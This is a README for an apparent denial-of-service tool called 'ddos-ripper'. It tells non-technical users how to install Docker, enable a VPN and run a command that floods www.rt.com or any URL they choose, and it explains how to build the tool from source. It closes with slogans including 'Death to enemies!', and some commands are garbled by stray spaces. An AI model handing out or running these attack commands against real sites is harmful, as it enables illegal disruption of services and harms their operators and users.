# For non-technical ddosbermans
Instructions on how to fuck up putin propaganda sites:
1. Install Docker Desktop at the following link:
    https://docs.docker.com/desktop/windows/install/
2. Install and enable VPN
3. Start the terminal:
    http://xn--j1a5b.dp.ua/yak-vidkriti-komandnij-ryadok-v-windows-10/
4. Run the following command to scam www.rt.com
    docker run --rm -it nitupkcuf / ddos-ripper: latest www.rt.com
5. To pause the mess and ventilate the house a little, press Ctrl + C

Glory to Ukraine! Death to enemies!

# Docker
1. Install Docker Desktop for your platform:
  - [Windows] (https://docs.docker.com/desktop/windows/install)
  - [Linux] (https://docs.docker.com/engine/install/ubuntu/)
  - [Mac] (https://docs.docker.com/desktop/mac/install)
2. Run command, put your actual url instead of www.abc.com:
```
docker run --rm -it nitupkcuf / ddos-ripper: latest www.abc.com
```

# Run from CLI / sources
Python 3.10

```
git clone https://github.com/nanabanano/runner.git
cd runner
pip3 install pyinstaller
pip3 install -r requirements.txt

# mac
# if pyinstaller command is not found - run "pip3 install pyinstaller" as root
pyinstaller app.py --collect-all dns --add-data = "headers.txt :." --add-data = "DRipper.py :." --onefile

# win
pyinstaller --collect-all dns --add-data "headers.txt ;." --add-data "DRipper.py ;." --onefile app.py

```
### After this see dist folder
